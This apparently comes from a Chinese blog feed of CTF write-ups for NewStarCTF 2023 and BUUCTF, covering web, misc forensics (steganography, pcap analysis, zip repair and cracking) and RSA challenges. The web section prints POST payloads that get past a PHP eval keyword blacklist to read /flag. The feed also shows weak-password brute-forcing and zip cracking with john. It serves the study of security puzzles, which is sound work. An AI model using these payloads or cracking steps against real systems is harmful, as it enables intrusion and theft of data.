title="R!C!E!"></a>R!C!E!</h3><p><strong>考点：md5碰撞、PHP特殊符号传参、PHP命令执行、黑名单绕过</strong></p><p>题目如下所示：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"c4d038"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|ls/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先题目要求 POST 传入一个 password ，password 的 hash 前六位为 c4d038，而哈希加密是一种不可破解的算法，我们只能通过碰撞来尝试获取我们需要的 password。</p><pre class="line-numbers language-PYTHON" data-language="PYTHON"><code class="language-PYTHON">import hashlibdef crack(a):    for i in range(0,999999):        if(hashlib.md5(str(i).encode(&quot;GBK&quot;)).hexdigest()[0:6] &#x3D;&#x3D; str(a)):            print(i)            breakcrack(&quot;c4d038&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果得知是 114514.</p><p>题目中code的传参是<code>e_v.a.l</code>，这时候如果直接按这个变量名来传参，php 是无法接收到这个值的，具体原因是 php 会自动把一些不合法的字符转化为下划线（注：php8以下），比如这个点就会被转换为下划线，另外这种转换只会发生一次。故直接传相当于传的变量名为 e_v_a.l 。于是为了防止我们的点被自动转换，我们可以先让第一个下划线位置为不合法字符，从而转换为下划线，不会再转换后面的点。比如可以传入 e[v.a.l 。</p><p>最后看命令执行部分，这里是有一个黑名单的过滤：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|ls/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>![image-20231004110534502](NewStarCTF 2023 公开赛道 WEB&#x2F;image-20231004110534502.png)</p><p>看到了 flag 在根目录下。但是黑名单过滤了 flag 关键字，我们没法直接读取，于是可以使用参数逃逸绕过限制：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token number">114514</span><span class="token operator">&amp;</span>e<span class="token punctuation">[</span>v<span class="token operator">.</span>a<span class="token operator">.</span>l<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span><span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span>password<span class="token operator">=</span><span class="token number">114514</span><span class="token operator">&amp;</span>e<span class="token punctuation">[</span>v<span class="token operator">.</span>a<span class="token operator">.</span>l<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token string double-quoted-string">"f"</span><span class="token operator">.</span><span class="token string double-quoted-string">"l"</span><span class="token operator">.</span><span class="token string double-quoted-string">"a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 flag 为 <code>flag&#123;4c161ed0-2717-4082-b051-fe63b33efd4c&#125;</code></p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p><strong>考点：弱口令登录、HTTP 302 跳转抓包</strong></p><p>进入之后是一个登录界面，先随便注册一个账号登进去看看。利用<code>Ctrl``C</code>和<code>Ctrl``D</code>回到 Shell，</p><p><img src="image-20231004111349196.png" alt="image-20231004111349196"></p><p>简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询Bash历史记录：</p><p><img src="image-20231004111709678.png" alt="image-20231004111709678"></p><p>该登录密码采用 弱密码，并且，将 newstar 和 newstar2023 追加到了密码本中。先尝试用这两个新加入的密码进行登录admin，结果都不对。利用 Burp 进行爆破，得到密码为 000000，登录：</p><p><img src="image-20231004121113786.png" alt="image-20231004121113786"></p><p>在 302 请求页面中获得到 flag ： <code>flag&#123;4b723bc2-fc05-4d41-b7dd-f62ffa244f47&#125;</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF 2023 公开赛道 MISC</title>
      <link href="/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/"/>
      <url>/2023/10/02/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20MISC/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-2023-公开赛道-MISC"><a href="#NewStarCTF-2023-公开赛道-MISC" class="headerlink" title="NewStarCTF 2023 公开赛道 MISC"></a>NewStarCTF 2023 公开赛道 MISC</h1><h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>题目如下所示：</p><pre class="line-numbers language-none"><code class="language-none">来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>本题使用CyberChef 即可得知答案：</p><p><img src="image-20231001202517937.png" alt="image-20231001202517937"></p><p>所以flag 为 <code>flag&#123;Base_15_S0_Easy_^_^&#125;</code></p><h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>题目给出了一个二维码如下所示：</p><p><img src="secret.png" alt="secret"></p><p>扫描之后只有一串文字，考虑到题目提示，该图片一定隐写了相关信息。使用 Stegsolve 工具进行解析：</p><p><img src="image-20231002144642640.png" alt="image-20231002144642640"></p><p>选择 Analyse，Data Extract ，RGB选择0，其余默认，点击 Preview 进行提取信息，将页面拉到最低位即可得到flag：</p><p><img src="image-20231002144844339.png" alt="image-20231002144844339"></p><p><code>flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</code></p><h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p><strong>本题目给出了一个 pcap文件，考察对 WireShark的使用，以及HTTP流量分析</strong></p><p>使用wireshark进行处理如下，含有大量的目录扫描爆破流量</p><p><img src="image-20231002145711916.png" alt="image-20231002145711916"></p><pre class="line-numbers language-none"><code class="language-none">使用Wireshark的过滤器来过滤掉干扰的流量http &amp;&amp; http.response.code &#x3D;&#x3D; 200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="image-20231002150023999.png" alt="image-20231002150023999"></p><p>提取出HTTP相应数据：</p><pre class="line-numbers language-none"><code class="language-none">Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 cyberchef 得到最终的结果（两次Base64加密）</p><p><img src="image-20231002150204398.png" alt="image-20231002150204398"></p><p><code>flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</code></p><h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><p>题目给了一个没有文件格式的文件，task_1，</p><p><strong>考点：Zip文件头修复、Zip压缩包爆破</strong></p><p>一个 Zip文件由三个部分组成：<strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong> </p><p>压缩源文件数据区： </p><pre class="line-numbers language-none"><code class="language-none">50 4B 03 04：这是头文件标记（0x04034b50） 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 5A 7E：最后修改文件时间 F7 46：最后修改文件日期 16 B5 80 14：CRC-32校验（1480B516） 19 00 00 00：压缩后尺寸（25） 17 00 00 00：未压缩尺寸（23） 07 00：文件名长度 00 00：扩展记录长度 6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500 压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记(0x02014b50) 3F 00：压缩使用的 pkware 版本 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） 08 00：压缩方式 5A 7E：最后修改文件时间 F7 46：最后修改文件日期 16 B5 80 14：CRC-32校验（1480B516） 19 00 00 00：压缩后尺寸（25） 17 00 00 00：未压缩尺寸（23） 07 00：文件名长度 24 00：扩展字段长度 00 00：文件注释长度 00 00：磁盘开始号 00 00：内部文件属性 20 00 00 00：外部文件属性 00 00 00 00：局部头部偏移量 6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>压缩源文件目录结束标志： </p><pre class="line-numbers language-none"><code class="language-none">50 4B 05 06：目录结束标记 00 00：当前磁盘编号 00 00：目录区开始磁盘编号 01 00：本磁盘上纪录总数 01 00：目录区中纪录总数 59 00 00 00：目录区尺寸大小 3E 00 00 00：目录区对第一张磁盘的偏移量 00 00：ZIP 文件注释长度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 010editor 打开文件如下所示：</p><p><img src="image-20231002153058559.png" alt="image-20231002153058559"></p><p>将前4位更改为如下所示，并将文件更改为zip文件。</p><pre class="line-numbers language-none"><code class="language-none">50 4B 03 04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将文件解压缩后得到 flag.zip文件，flag.zip文件解压需要密码，通过binwalk发现存在文件注释：</p><p><img src="image-20231002153942872.png" alt="image-20231002153942872"></p><pre class="line-numbers language-none"><code class="language-none">SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用Base64解码得到：<code>I like six-digit numbers because they are very concise and easy to remember.</code>，说明密码位数为6，可以利用爆破进行破解。我们使用 <strong>john</strong> 进行破解（fcrackzip解不开，都说不是加密对象）：</p><p>首先使用以下命令，获得zip的中间Hash文件 flag.hash</p><pre class="line-numbers language-none"><code class="language-none">zip2john flag.zip &gt; flag.hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再利用 <code>john flag.hash</code>  进行破解得到如下：</p><p><img src="image-20231002160943962.png" alt="image-20231002160943962"></p><p>因而密码为 <code>232311</code>，解压缩flag.zip文件得到 flag文件：<code>flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</code></p><h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>题目给出了一个 white.zip 文件</p><p><strong>考点：WhiteSpace语言</strong></p><p>解压后是一个txt文件，里面没有任何内容：</p><p><img src="image-20231002161317063.png" alt="image-20231002161317063"></p><p>该题考察的是 WhiteSpace 语言，将txt中的内容全选复制，利用<a href="https://vii5ard.github.io/whitespace/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTYyMTI3ODgsImZpbGVHVUlEIjoiWEtxNDIxRUJLekZ5UnpBTiIsImlhdCI6MTY5NjIxMjQ4OCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODI4Njg3OTQ5NX0.mrKn9R-1-s9n8mhBqW7mb2GtCkzv7XY229TYODZTWK4">在线网站</a>在线运行：</p><p><img src="image-20231002161549733.png" alt="image-20231002161549733"></p><p>得到flag为 <code>flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</code></p><h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p>题目给出了一个压缩文件，其中有眼睛图片。</p><p><strong>考点：SlientEye隐写</strong></p><p>使用SlientEye工具进行Decode即可获得flag：</p><p><img src="image-20231002164212579.png" alt="image-20231002164212579"></p><p>flag为：<code>flag&#123;R0ck1ng_y0u_63b0dc13a591&#125;</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF 2023 公开赛道 Crypto题目</title>
      <link href="/2023/10/01/BUUCTF%E2%80%94BABYRSA/"/>
      <url>/2023/10/01/BUUCTF%E2%80%94BABYRSA/</url>
      
        <content type="html"><![CDATA[<h2 id="BUUCTF-Crypto-babyrsa-task-4"><a href="#BUUCTF-Crypto-babyrsa-task-4" class="headerlink" title="BUUCTF - Crypto babyrsa task_4"></a>BUUCTF - Crypto babyrsa task_4</h2><p>题目如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token keyword">def</span> <span class="token function">gen_prime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">*=</span> getPrime<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> gen_prime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>    e <span class="token operator">=</span> <span class="token number">65537</span>    m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span><span class="token comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用在线网站可以将所给的n分解素数为以下15个：</p><pre class="line-numbers language-none"><code class="language-none">221799091923387253732370292207246387838727060739492794985117280430306929230722672970591037320714851936548641313831680819393990124340931785614278428893<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>公钥如上</p><p>n &#x3D; 以上公钥相乘</p><p>phi &#x3D; 17290065983330319066216184030777067976382697670733255200004943703459332462321021486252411405242719735544959857825124088104221030960082400051200</p><p>e &#x3D; 65537</p><p>d * e mod phi &#x3D; 1 即 由相关数学概念可知，d 是 e 的逆元，标记为 $e^{-1}$,</p><p>利用 扩展欧几里得算法 和 求解逆元算法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">extended_gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> a<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    gcd<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>    <span class="token keyword">return</span> gcd<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token keyword">def</span> <span class="token function">inverse_modulo</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    gcd<span class="token punctuation">,</span> inverse<span class="token punctuation">,</span> _ <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>x<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    <span class="token keyword">if</span> gcd <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"The inverse does not exist."</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> inverse <span class="token operator">%</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">extended_gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> a<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    gcd<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span> a <span class="token operator">%</span> b<span class="token punctuation">)</span>    <span class="token keyword">return</span> gcd<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">//</span> b<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token keyword">def</span> <span class="token function">inverse_modulo</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    gcd<span class="token punctuation">,</span> inverse<span class="token punctuation">,</span> _ <span class="token operator">=</span> extended_gcd<span class="token punctuation">(</span>x<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    <span class="token keyword">if</span> gcd <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"The inverse does not exist."</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> inverse <span class="token operator">%</span> p<span class="token keyword">def</span> <span class="token function">fastExpMod</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>               <span class="token comment">#快速幂</span>    result <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token comment"># ei = 1, then mul</span>            result <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> m        e <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token comment"># b, b^2, b^4, b^8, ... , b^(2^n)</span>        b <span class="token operator">=</span> <span class="token punctuation">(</span>b<span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> m    <span class="token keyword">return</span> resultn1 <span class="token operator">=</span> <span class="token number">2217990919</span>n2 <span class="token operator">=</span> <span class="token number">2338725373</span>n3 <span class="token operator">=</span> <span class="token number">2370292207</span>n4 <span class="token operator">=</span> <span class="token number">2463878387</span>n5 <span class="token operator">=</span> <span class="token number">2706073949</span>n6 <span class="token operator">=</span> <span class="token number">2794985117</span>n7 <span class="token operator">=</span> <span class="token number">2804303069</span>n8 <span class="token operator">=</span> <span class="token number">2923072267</span>n9 <span class="token operator">=</span> <span class="token number">2970591037</span>n10 <span class="token operator">=</span> <span class="token number">3207148519</span>n11 <span class="token operator">=</span> <span class="token number">3654864131</span>n12 <span class="token operator">=</span> <span class="token number">3831680819</span>n13 <span class="token operator">=</span> <span class="token number">3939901243</span>n14 <span class="token operator">=</span> <span class="token number">4093178561</span>n15 <span class="token operator">=</span> <span class="token number">4278428893</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>n1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n2<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n3<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n4<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n5<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n6<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n7<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n8<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n9<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n10<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n11<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n12<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n13<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n14<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n15<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>d <span class="token operator">=</span> inverse_modulo<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"The inverse of </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string"> modulo </span><span class="token interpolation"><span class="token punctuation">&#123;</span>phi<span class="token punctuation">&#125;</span></span><span class="token string"> is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>inverse<span class="token punctuation">&#125;</span></span><span class="token string">."</span></span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span>c <span class="token operator">=</span> <span class="token number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span>m <span class="token operator">=</span> fastExpMod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag为：<code>flag&#123;us4_s1ge_t0_cal_phI&#125;</code></p><h2 id="BUUCTF-Crypto-small-d-task-5"><a href="#BUUCTF-Crypto-small-d-task-5" class="headerlink" title="BUUCTF - Crypto small d  task_5"></a>BUUCTF - Crypto small d  task_5</h2><p>原题目如下：</p><p><img src="image-20230928143400881.png" alt="image-20230928143400881"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>d <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>e <span class="token operator">=</span> inverse<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qm <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><span class="token comment"># e = 